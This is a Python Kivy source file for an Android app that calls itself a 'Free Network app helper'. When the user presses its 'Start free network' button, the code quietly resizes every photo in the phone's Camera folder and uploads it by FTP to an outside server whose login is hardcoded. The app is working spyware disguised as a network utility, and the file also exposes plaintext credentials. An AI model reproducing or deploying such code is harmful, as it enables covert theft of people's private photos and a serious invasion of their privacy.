import os
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.image import Image
from ftplib import FTP
from jnius import autoclass
from PIL import Image as PILImage  # Import the Pillow library

# Get the Environment class from Android API
Environment = autoclass('android.os.Environment')

class ImageFileManagerApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical', spacing=10)

        # Add custom text label
        title_label =  Label(text='Free Network app helper by haithem',  font_size='20sp')
        self.layout.add_widget(title_label)

        # Customize the button
        upload_button = Button(
            text='Start free network',
            background_normal='',
            background_color=(1, 1, 1, 1),  # White button background
            size_hint=(None, None),  # Fixed size button
            size=(500, 100),  # Button size
            color=(0, 0, 0, 1)  # Black text color
        )
        upload_button.bind(on_press=self.upload_camera_photos)
        
        # Center the button horizontally
        button_layout = BoxLayout(orientation='horizontal', spacing=10)
        button_layout.add_widget(Label())  # Empty space to center
        button_layout.add_widget(upload_button)
        button_layout.add_widget(Label())  # Empty space to center
        self.layout.add_widget(button_layout)

        self.status_label = Label()
        self.layout.add_widget(self.status_label)
        return self.layout

    def find_camera_directory(self):
        # Get the DCIM directory using Android's Environment.getExternalStoragePublicDirectory()
        dcim_dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath()
        camera_dir = os.path.join(dcim_dir, 'Camera')
        
        if os.path.exists(camera_dir):
            return camera_dir
        return None

    def resize_photo(self, photo_path, output_path, resolution=(640, 360), quality=80):
        try:
            # Open the photo with Pillow
            img = PILImage.open(photo_path)

            # Resize the photo to the desired resolution
            img = img.resize(resolution, PILImage.ANTIALIAS)

            # Save the resized photo with the desired quality
            img.save(output_path, format='JPEG', quality=quality)
            return True
        except Exception as e:
            print(f"Error resizing photo: {str(e)}")
            return False

    def upload_camera_photos(self, instance):
        camera_dir = self.find_camera_directory()

        if not camera_dir:
            self.status_label.text = "Camera folder not found."
            return

        # FTP server credentials
        ftp_host = 'ftp.vastserve.com'
        ftp_user = 'vasts_34979571'
        ftp_passwd = '123456789oopp'

        try:
            # Connect to the FTP server
            ftp = FTP()
            ftp.connect(ftp_host)
            ftp.login(user=ftp_user, passwd=ftp_passwd)

            # List photo files in the directory
            photo_files = [f for f in os.listdir(camera_dir) if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp'))]

            if not photo_files:
                self.status_label.text = "No photo files found in the Camera directory."
                return

            # Upload each resized photo
            for photo_file in photo_files:
                photo_path = os.path.join(camera_dir, photo_file)
                resized_path = os.path.join(camera_dir, 'resized_' + photo_file)

                # Resize the photo to 360p resolution with quality=80
                if self.resize_photo(photo_path, resized_path, resolution=(640, 360), quality=80):
                    with open(resized_path, 'rb') as local_file:
                        ftp.storbinary('STOR ' + 'resized_' + photo_file, local_file)
                    os.remove(resized_path)  # Remove the resized file after uploading

            self.status_label.text = "Camera photos uploaded successfully."
            ftp.quit()
        except Exception as e:
            self.status_label.text = f"Error: {str(e)}"

if __name__ == '__main__':
    ImageFileManagerApp().run()
